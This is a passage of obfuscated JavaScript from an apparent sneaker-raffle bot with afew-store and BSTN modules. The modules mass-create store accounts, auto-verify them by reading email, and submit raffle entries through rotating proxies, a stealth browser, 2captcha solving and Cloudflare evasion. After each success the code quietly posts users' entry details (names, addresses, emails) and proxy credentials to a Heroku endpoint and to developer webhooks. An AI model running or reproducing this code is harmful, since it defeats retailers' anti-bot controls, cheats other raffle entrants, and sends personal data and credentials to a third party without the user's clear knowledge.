                        var _0x57effe = JSON['parse'](_0x13dabd['readFileSync']('sizes.json', 'utf-8')), _0x4932d7 = _0x52188c[_0x5b4b28]['Url'], _0x573856 = _0x52188c[_0x5b4b28]['Size'], _0x5b1d59;
                        async function _0x5ab406() {
                            var _0x4f1823 = new _0x454518['CookieJar']();
                            console['log'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x25cd08;
                            let _0x5d9021 = {
                                'method': 'GET',
                                'cookieJar': _0x4f1823,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0xcb1861[0x2] + ':' + _0xcb1861[0x3] + '@' + _0xcb1861[0x0] + ':' + _0xcb1861[0x1]
                            }, _0x135afa = _0x4932d7['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0xe4b3ab = _0x135afa + '.json', _0x4a4bf0 = await _0x1a729a(_0xe4b3ab);
                            console['log'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x3a52e4 = _0x4a4bf0['data']['product']['variants'];
                            if (_0x573856 != 'RANDOM') {
                                if (_0x3a52e4[0x1]['option1']['includes']('W')) {
                                    const _0x54b439 = _0x57effe['women']['find'](_0x5f10fe => _0x5f10fe['EUsize'] === _0x573856);
                                    _0x54b439 && (_0x573856 = _0x54b439['size']);
                                } else {
                                    if (_0x3a52e4[0x1]['option1']['includes']('Y')) {
                                        const _0x295189 = _0x57effe['GS']['find'](_0x390541 => _0x390541['EUsize'] === _0x573856);
                                        _0x295189 && (_0x573856 = _0x295189['size']);
                                    } else {
                                        const _0xc37015 = _0x57effe['men']['find'](_0x3cbfdd => _0x3cbfdd['EUsize'] === _0x573856);
                                        _0xc37015 && (_0x573856 = _0xc37015['size']);
                                    }
                                }
                                for (var _0x2a97cb of _0x3a52e4) {
                                    _0x2a97cb['option1'] == _0x573856 && (_0x25cd08 = _0x2a97cb['id']);
                                }
                            } else {
                                var _0x102313 = Math['round'](Math['random']() * (_0x3a52e4['length'] - 0x1));
                                _0x25cd08 = _0x3a52e4[_0x102313]['id'];
                            }
                            console['log'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x1a729a('https://raffles.afew-store.com/cart/' + _0x25cd08 + ':1'), _0x5b1d59 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x5ab406();
                        } catch (_0x2b4810) {
                            if (_0x2b4810['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x2b4810);
                        }
                        const _0x2a8ae6 = await _0x5994b0['newPage']();
                        await _0x2a8ae6['setDefaultNavigationTimeout'](0x1d4c0), await _0x2a8ae6['authenticate']({
                            'username': '' + _0xcb1861[0x2],
                            'password': '' + _0xcb1861[0x3]
                        }), await _0x2a8ae6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2a8ae6['setRequestInterception'](!![]), _0x2a8ae6['on']('request', _0x35f776 => {
                            _0x35f776['resourceType']() === 'image' || _0x35f776['resourceType']() === 'font' || _0x35f776['resourceType']() === 'media' ? _0x35f776['abort']() : _0x35f776['continue']();
                        });
                        try {
                            await _0x2a8ae6['goto'](_0x5b1d59, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x2a8ae6['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2a8ae6['type']('#checkout_email', '' + _0x52188c[_0x5b4b28]['Email']), await _0xfa5357(0x320), await _0x2a8ae6['type']('#checkout_attributes_instagram', '' + _0x52188c[_0x5b4b28]['Follower']), await _0xfa5357(0x320), await _0x2a8ae6['select']('#checkout_shipping_address_country', '' + _0x52188c[_0x5b4b28]['Country']), await _0x2a8ae6['waitForTimeout'](0x258), await _0x2a8ae6['type']('#checkout_shipping_address_first_name', '' + _0x52188c[_0x5b4b28]['FirstName']), await _0x2a8ae6['waitForTimeout'](0x320), await _0x2a8ae6['type']('#checkout_shipping_address_last_name', '' + _0x52188c[_0x5b4b28]['LastName']), await _0x2a8ae6['waitForTimeout'](0x2bc), await _0x2a8ae6['type']('#checkout_shipping_address_address1', _0x52188c[_0x5b4b28]['Address1'] + '\x20' + _0x52188c[_0x5b4b28]['HouseNumber']), await _0x2a8ae6['waitForTimeout'](0x2bc), await _0x2a8ae6['type']('#checkout_shipping_address_address2', '' + _0x52188c[_0x5b4b28]['Address2']), await _0x2a8ae6['waitForTimeout'](0x2bc), await _0x2a8ae6['type']('#checkout_shipping_address_zip', '' + _0x52188c[_0x5b4b28]['Zip']), await _0x2a8ae6['waitForTimeout'](0x2bc), await _0x2a8ae6['type']('#checkout_shipping_address_city', '' + _0x52188c[_0x5b4b28]['City']), await _0x2a8ae6['waitForTimeout'](0x2bc);
                        if (_0x52188c[_0x5b4b28]['State'] != '')
                            try {
                                const _0x3adaa7 = JSON['parse'](_0x13dabd['readFileSync']('States.json', 'utf8'));
                                await _0xfa5357(0x1f4);
                                if (_0x52188c[_0x5b4b28]['State']['length'] > 0x2)
                                    for (let _0x296106 of _0x3adaa7) {
                                        if (_0x296106['Province'] == _0x52188c[_0x5b4b28]['State']) {
                                            await _0x2a8ae6['select']('#checkout_shipping_address_province', _0x296106['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x2a8ae6['select']('#checkout_shipping_address_province', _0x52188c[_0x5b4b28]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0xfa5357(0x1f4), console['log'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0xfa5357(0x190), _0x2a8ae6['evaluate'](() => {
                            const _0x7fbd82 = document['querySelector']('#continue_button');
                            for (var _0x5687c9 = 0x0; _0x5687c9 < 0x5; _0x5687c9++) {
                                if (_0x7fbd82) {
                                    _0x7fbd82['click'](), _0x7fbd82['click']();
                                    break;
                                } else
                                    _0xfa5357(0xfa0);
                            }
                        }), await _0x2a8ae6['waitForTimeout'](0x9c4);
                        try {
                            await _0x2a8ae6['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x2a8ae6['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x2ee20e => _0x2ee20e['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2a8ae6['waitForTimeout'](0x7d0), console['log'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x2a8ae6['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xfa5357(0x3e8), await _0x2a8ae6['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x5ccd30 => _0x5ccd30['submit']()), await _0xfa5357(0x3e8);
                        try {
                            await _0x2a8ae6['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2a8ae6['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x118ee3 => _0x118ee3['submit']());
                        try {
                            await _0x2a8ae6['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x120ca2 = 'no', _0x253d32(_0x52188c[_0x5b4b28], _0x310753), console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '')
                                try {
                                    await _0x33437b(_0x50b722['webhook'], _0x5f16f5['succesDEVMSG']);
                                } catch {
                                }
                            await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x5f16f5['succesDEVMSG']), await _0xfa5357(0xc8);
                            try {
                                await _0x33437b(_0x471d14, _0x5f16f5['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x4ee077['replace']('#', ''),
                                    'module': _0x310753['name'],
                                    'entrydata': JSON['stringify'](_0x3a5b35),
                                    'proxy': '' + _0x3ed895[_0x5b4b28]
                                };
                                var _0x36c1ab = JSON['stringify'](prxdata);
                                let _0x19bf66 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x36c1ab, _0x19bf66);
                            } catch (_0x24c167) {
                            }
                        } catch (_0x14101f) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x58146c) {
                        _0x58146c['message']['includes']('selector') && (_0x58146c = 'Connection\x20Error');
                        console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20' + _0x58146c)), _0x2697ec = '' + _0x58146c;
                        var _0x426d8f = await _0xc964cf(_0x52188c[_0x5b4b28], _0x310753, 'dev', !![], _0x2697ec);
                        _0x5f16f5['errorDEV'] = { 'embeds': [_0x426d8f] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x5f16f5['errorDEV']), await _0x33437b(_0x5e1645, _0x5f16f5['errorDEV']), _0x120ca2 = 'yes';
                    } finally {
                        _0x5994b0 && _0x5994b0['close']();
                        if (_0x120ca2 == 'yes' && _0x3f4f22 != 0x5 && _0x2697ec != 'Size\x20Not\x20Found') {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3f4f22 + '\x20/\x205)')), _0x5b4b28 = _0x5b4b28 - 0x1, _0x3f4f22 = _0x3f4f22 + 0x1;
                            continue;
                        }
                        _0x120ca2 == 'yes' && _0x3f4f22 >= 0x5 && (_0x3003c7(_0x52188c[_0x5b4b28], _0x310753), _0x120ca2 = 'no', _0x3f4f22 = 0x0);
                        if (_0x5b4b28 + 0x1 == _0x52188c['length']) {
                            await _0xfa5357(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x50b722['AfewDelay'] + '\x20ms'), await _0xfa5357(_0x50b722['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x193085, _0x437fdc, _0x124282) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x58d729 = 0x0; _0x58d729 < _0x437fdc['length']; _0x58d729++) {
                        if (_0x48a30b != 'yes')
                            var _0x48a30b = '', _0x4557b5 = 0x0;
                        var _0x4f8cbf;
                        try {
                            await _0x559c6d(_0x437fdc, _0x58d729);
                        } catch {
                            _0x48a30b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3b7620(_0x193085['name'] + '\x20Task\x20' + (_0x58d729 + 0x1) + '\x20/\x20' + _0x437fdc['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        var _0xfe4c96 = await _0xc964cf(_0x437fdc[_0x58d729], _0x193085, 'acc', ![]);
                        const _0x4f55d2 = { 'succesDEVMSG': { 'embeds': [_0xfe4c96] } }, _0x35cd39 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x3f2e96 = Math['round'](Math['random']() * (_0x124282['length'] - 0x1)), _0xb1fa26 = _0x124282[_0x3f2e96]['split'](':'), _0xc4e515;
                        try {
                            _0xc4e515 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xb1fa26[0x0] + ':' + _0xb1fa26[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xc4e515 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xb1fa26[0x0] + ':' + _0xb1fa26[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x14ef8f = await _0xc4e515['newPage']();
                            await _0x14ef8f['authenticate']({
                                'username': '' + _0xb1fa26[0x2],
                                'password': '' + _0xb1fa26[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x193085['name'] + ']\x20Task\x20' + (_0x58d729 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x14ef8f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x14ef8f['setRequestInterception'](!![]), _0x14ef8f['on']('request', _0x5e4498 => {
                                _0x5e4498['resourceType']() === 'image' ? _0x5e4498['abort']() : _0x5e4498['continue']();
                            });
                            try {
                                await _0x14ef8f['goto']('' + _0x35cd39), await _0x14ef8f['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x48a30b = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x14ef8f['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x391006() + '\x20[' + _0x193085['name'] + ']\x20Task\x20' + (_0x58d729 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xfa5357(0x7d0), console['log'](_0x391006() + '\x20[' + _0x193085['name'] + ']\x20Task\x20' + (_0x58d729 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xfa5357(0x190), await _0x14ef8f['waitForSelector']('#firstname'), await _0x14ef8f['type']('#firstname', _0x437fdc[_0x58d729]['FirstName'], { 'delay': 0xf0 }), await _0xfa5357(0x190), await _0x14ef8f['type']('#lastname', _0x437fdc[_0x58d729]['LastName'], { 'delay': 0xe6 }), await _0xfa5357(0x190), await _0x14ef8f['type']('#email_address', _0x437fdc[_0x58d729]['Email'], { 'delay': 0x122 }), await _0xfa5357(0x190), await _0x14ef8f['type']('#password', _0x437fdc[_0x58d729]['Password'], { 'delay': 0x82 }), await _0xfa5357(0x1f4), await _0x14ef8f['type']('#password-confirmation', _0x437fdc[_0x58d729]['Password'], { 'delay': 0x7c }), console['log'](_0x391006() + '\x20[' + _0x193085['name'] + ']\x20Task\x20' + (_0x58d729 + 0x1) + '\x20:\x20Sending\x20Request'), await _0xfa5357(0x2bc), await _0x14ef8f['$eval']('#form-validate', _0x54c5b2 => _0x54c5b2['submit']()), await _0xfa5357(0x1388);
                            const _0x59abb1 = await _0x14ef8f['$']('#email_address-error');
                            if (_0x59abb1)
                                throw new Error('Invalid\x20Email');
                            const _0x385830 = await _0x14ef8f['$']('#password-error');
                            if (_0x385830)
                                throw new Error('Invalid\x20Password');
                            await _0x14ef8f['waitForSelector']('div.mesg-success'), _0x48a30b = 'no', console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x193085['name'] + ']\x20Task\x20' + (_0x58d729 + 0x1) + '\x20:\x20Account\x20' + _0x437fdc[_0x58d729]['Email'] + '\x20Generated')), _0x13dabd['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x437fdc[_0x58d729]['Email'] + ',' + _0x437fdc[_0x58d729]['Password']);
                            try {
                                _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x4f55d2['succesDEVMSG']);
                            } catch {
                            }
                            await _0x33437b(_0x96b204, _0x4f55d2['succesDEVMSG']);
                            let _0x134e1d = _0x437fdc[_0x58d729];
                            try {
                                prxdata = {
                                    'username': _0x4ee077['replace']('#', ''),
                                    'module': _0x193085['name'],
                                    'entrydata': JSON['stringify'](_0x134e1d),
                                    'proxy': '' + _0x124282[_0x58d729]
                                };
                                var _0x3acecc = JSON['stringify'](prxdata);
                                let _0x2ae7db = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x3acecc, _0x2ae7db);
                            } catch (_0xcba538) {
                            }
                            console['log'](_0x34d98c['yellow'](_0x391006() + '\x20[' + _0x193085['name'] + ']\x20Task\x20' + (_0x58d729 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x4b615c) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x193085['name'] + ']\x20Task\x20' + (_0x58d729 + 0x1) + '\x20:\x20' + _0x4b615c)), _0x4f8cbf = '' + _0x4b615c;
                            var _0x2eef45 = await _0xc964cf(_0x437fdc[_0x58d729], _0x193085, 'acc', !![], _0x4f8cbf);
                            _0x4f55d2['errorDEV'] = { 'embeds': [_0x2eef45] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x4f55d2['errorDEV']), await _0x33437b(_0x5e1645, _0x4f55d2['errorDEV']), _0x48a30b = 'yes';
                        } finally {
                            if (_0xc4e515)
                                _0xc4e515['close']();
                            if (_0x48a30b == 'yes' && _0x4557b5 != 0x5) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x193085['name'] + ']\x20Task\x20' + (_0x58d729 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4557b5 + '\x20/\x205)')), _0x58d729 = _0x58d729 - 0x1, _0x4557b5 = _0x4557b5 + 0x1;
                                continue;
                            }
                            _0x48a30b == 'yes' && _0x4557b5 >= 0x5 && (_0x3003c7(_0x437fdc[_0x58d729], _0x193085), _0x48a30b = 'no', _0x4557b5 = 0x0), console['log'](_0x391006() + '\x20[' + _0x193085['name'] + ']\x20Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2ecd7b, _0x1932bb) {
                    var _0x3412fb = ![], _0x78949e = [];
                    async function _0x437461() {
                        var _0xa03aa1 = new _0x108c6b({
                            'user': _0x50b722['masterMail'],
                            'password': _0x50b722['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xbc215(_0x4db986) {
                            _0xa03aa1['openBox']('INBOX', ![], _0x4db986);
                        }
                        _0xa03aa1['once']('ready', function () {
                            _0xbc215(function (_0x19616b, _0x5b4f5d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x19616b)
                                    throw _0x19616b;
                                _0xa03aa1['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x12c992, _0x8a823b) {
                                    if (!_0x8a823b || !_0x8a823b['length'])
                                        console['log'](_0x391006() + '\x20[' + _0x2ecd7b['name'] + ']\x20No\x20mails\x20found'), _0xa03aa1['end']();
                                    else {
                                        var _0x3d2e2e = _0xa03aa1['seq']['fetch'](_0x8a823b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3d2e2e['on']('message', function (_0x1b33c1, _0x250b00) {
                                            var _0x4826ae = '(#' + _0x250b00 + ')\x20';
                                            _0x1b33c1['on']('body', function (_0x2f8185, _0x28dd7c) {
                                                _0x2e7895(_0x2f8185, (_0x527e0b, _0x12f227) => {
                                                    var _0x52b5f4 = _0x12f227['text']['split']('[')[0x2], _0x1deff2 = _0x52b5f4['split'](']')[0x0];
                                                    _0x78949e['push'](_0x1deff2);
                                                });
                                            }), _0x1b33c1['once']('end', function () {
                                            });
                                        }), _0x3d2e2e['once']('error', function (_0x171d8f) {
                                            console['log']('Fetch\x20error:\x20' + _0x171d8f), _0x3412fb = !![];
                                        }), _0x3d2e2e['once']('end', function () {
                                            _0xa03aa1['end'](), _0x3412fb = !![];
                                        });
                                    }
                                });
                            });
                        }), _0xa03aa1['once']('error', function (_0x1d6b08) {
                            console['log'](_0x34d98c['red'](_0x1d6b08['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3412fb = !![];
                        }), _0xa03aa1['once']('end', async function () {
                            _0x3412fb = !![];
                        }), _0xa03aa1['connect']();
                    }
                    async function _0x3870ba(_0x295e8b, _0x1d4e8e, _0x177f77) {
                        _0x1528cf['use'](_0x3af7cd());
                        for (var _0x915a42 = 0x0; _0x915a42 < _0x1d4e8e['length']; _0x915a42++) {
                            if (_0x17f057 != 'yes')
                                var _0x17f057 = '', _0x5d03f0 = 0x0;
                            var _0x413eb9 = Math['round'](Math['random']() * (_0x177f77['length'] - 0x1)), _0x3c65ef = _0x177f77[_0x413eb9]['split'](':'), _0x40b959;
                            try {
                                _0x40b959 = await _0x1528cf['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3c65ef[0x0] + ':' + _0x3c65ef[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x40b959 = await _0x1528cf['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x3c65ef[0x0] + ':' + _0x3c65ef[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0xcd9c44 = await _0x40b959['newPage']();
                                await _0xcd9c44['authenticate']({
                                    'username': '' + _0x3c65ef[0x2],
                                    'password': '' + _0x3c65ef[0x3]
                                }), console['log'](_0x391006() + '\x20[' + _0x295e8b['name'] + ']\x20Task\x20' + (_0x915a42 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0xcd9c44['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xcd9c44['setRequestInterception'](!![]), _0xcd9c44['on']('request', _0x1d39b0 => {
                                    _0x1d39b0['resourceType']() === 'image' || _0x1d39b0['resourceType']() === 'font' || _0x1d39b0['resourceType']() === 'media' ? _0x1d39b0['abort']() : _0x1d39b0['continue']();
                                }), console['log'](_0x391006() + '\x20[' + _0x295e8b['name'] + ']\x20Task\x20' + (_0x915a42 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0xcd9c44['goto'](_0x1d4e8e[_0x915a42]);
                                } catch {
                                    _0x17f057 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x391006() + '\x20[' + _0x295e8b['name'] + ']\x20Task\x20' + (_0x915a42 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xcd9c44['waitForTimeout'](0xbb8);
                                try {
                                    await _0xcd9c44['waitForSelector']('.account-nav'), _0x17f057 = 'no', console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x295e8b['name'] + ']\x20Task\x20' + (_0x915a42 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x3af5dc = await _0xc964cf(null, _0x295e8b, 'ver', ![]);
                                    const _0x12cde6 = { 'succesDEVMSG': { 'embeds': [_0x3af5dc] } };
                                    await _0x33437b(_0x1fcdbe, _0x12cde6['succesDEVMSG']);
                                } catch {
                                    _0x17f057 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x12fd87) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x295e8b['name'] + ']\x20Task\x20' + (_0x915a42 + 0x1) + '\x20:\x20' + _0x12fd87));
                                var _0x2edc5f = _0x12fd87, _0x3a9d9c = await _0xc964cf(null, _0x295e8b, 'ver', !![], _0x2edc5f);
                                const _0xa8f728 = { 'errorDEVMSG': { 'embeds': [_0x3a9d9c] } };
                                _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0xa8f728['errorDEVMSG']), await _0x33437b(_0x5e1645, _0xa8f728['errorDEVMSG']);
                            } finally {
                                _0x40b959['close']();
                                if (_0x17f057 == 'yes' && _0x5d03f0 != 0x5) {
                                    console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x295e8b['name'] + ']\x20Task\x20' + (_0x915a42 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5d03f0 + '\x20/\x205)')), _0x915a42 = _0x915a42 - 0x1, _0x5d03f0 = _0x5d03f0 + 0x1;
                                    continue;
                                }
                                _0x17f057 == 'yes' && _0x5d03f0 >= 0x5 && (_0x17f057 = 'no', _0x5d03f0 = 0x0), console['log'](_0x391006() + '\x20[' + _0x295e8b['name'] + ']\x20Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                            }
                        }
                    }
                    try {
                        _0x437461();
                        while (!_0x3412fb) {
                            await _0xfa5357(0xfa0);
                        }
                        console['log']('Found\x20' + _0x78949e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xfa5357(0x7d0);
                    }
                    await _0x3870ba(_0x2ecd7b, _0x78949e, _0x1932bb);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x497ac9, _0x1304f2, _0x3e8ed3) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2795d9 = 0x0; _0x2795d9 < _0x1304f2['length']; _0x2795d9++) {
                        var _0x1cbd2c, _0xe0508e = _0x1304f2[_0x2795d9];
                        try {
                            await _0x559c6d(_0x1304f2, _0x2795d9);
                        } catch {
                            _0x4fd80f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x2c2fff(_0x5cd248) {
                            const _0x1d0c89 = _0x13dabd['readFileSync']('../successful-tasks.csv', 'utf8'), _0x363335 = _0x3d5697['parse'](_0x1d0c89, { 'header': !![] })['data'];
                            let _0x35eeb2 = ![];
                            for (var _0x17203a of _0x363335) {
                                if (_0x17203a['Url'] == _0x5cd248['Url'] && _0x17203a['Email'] == _0x5cd248['Email']) {
                                    _0x35eeb2 = !![];
                                    break;
                                }
                            }
                            return _0x35eeb2;
                        }
                        if (await _0x2c2fff(_0x1304f2[_0x2795d9]) == !![]) {
                            console['log'](_0x391006() + '\x20[' + _0x497ac9['name'] + ']\x20Task\x20' + (_0x2795d9 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x4fd80f != 'yes')
                            var _0x4fd80f = '', _0x3fe229 = 0x0;
